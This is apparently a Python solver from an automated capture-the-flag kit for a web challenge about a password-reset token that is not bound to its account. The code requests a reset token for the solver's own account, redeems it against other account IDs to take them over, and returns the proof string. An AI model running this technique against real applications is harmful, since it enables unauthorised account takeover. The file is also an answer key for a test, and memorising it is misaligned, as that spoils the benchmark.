"""D25 "Reset Expectations" (web-exploitation-day-17-reset-expectations): password-reset token not bound to account.

Kit shape: /api/clues = {framework, feature_route, secondary_route, recovery_guide_route, current_role}; GET
recovery_guide_route -> {request_route, redeem_route, account_parameter, token_parameter, accounts:[{id, label,
self_service}]}; GET request_route?account_id=<self_service id> -> {"ok":true,"token":...}; other ids ->
{"error":"self_service_only"}; GET redeem_route?token=<own token>&account_id=<victim id> -> {"ok":true,
"effect":"synthetic_account_recovery","evidence":"proof_..."}. Re-runnable on any fresh target.
"""
import json
import re
import urllib.parse

from lib import websolve


def _json(body):
    try:
        j = json.loads(body or "")
        return j if isinstance(j, dict) else {}
    except ValueError:
        return {}


def _route(cl, *pats):
    for p in pats:
        for k, v in cl.items():
            if re.search(p, k, re.I) and isinstance(v, str) and re.fullmatch(r"/[\w./-]+", v):
                return v
    return None


def _get(base, route, params):
    url = urllib.parse.urljoin(base, route) + ("?" + urllib.parse.urlencode(params) if params else "")
    st, body, _ = websolve.fetch(url)
    if st == 405:   # POST-only step: form body
        st, body, _ = websolve.fetch(urllib.parse.urljoin(base, route), data=params, method="POST")
    return body


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    guide_route = _route(cl, r"recovery|reset")
    if not guide_route:
        return None
    guide = _json(websolve.fetch(urllib.parse.urljoin(base, guide_route))[1])
    req = guide.get("request_route") or _route(cl, r"feature")
    redeem = guide.get("redeem_route") or _route(cl, r"secondary")
    acct_p = guide.get("account_parameter") or "account_id"
    tok_p = guide.get("token_parameter") or "token"
    accts = [a for a in guide.get("accounts") or [] if isinstance(a, dict) and "id" in a]
    mine = [a for a in accts if a.get("self_service")]
    victims = [a for a in accts if not a.get("self_service")]
    if not (req and mine and victims):
        return None
    tj = _json(_get(base, req, {acct_p: mine[0]["id"]}))
    p = websolve.proof(json.dumps(tj))
    if p:
        return p
    token = tj.get(tok_p) or tj.get("token")
    redeem = tj.get("redeem_route") or redeem
    if not (token and redeem):
        return None
    for v in victims:
        p = websolve.proof(_get(base, redeem, {tok_p: token, acct_p: v["id"]}))
        if p:
            return p
    return None


KEY_MAP = [(r"recovery_guide_route|recovery|password_reset|reset_route", "day25_web_reset_expectations")]
HANDLERS = {"day25_web_reset_expectations": exploit}
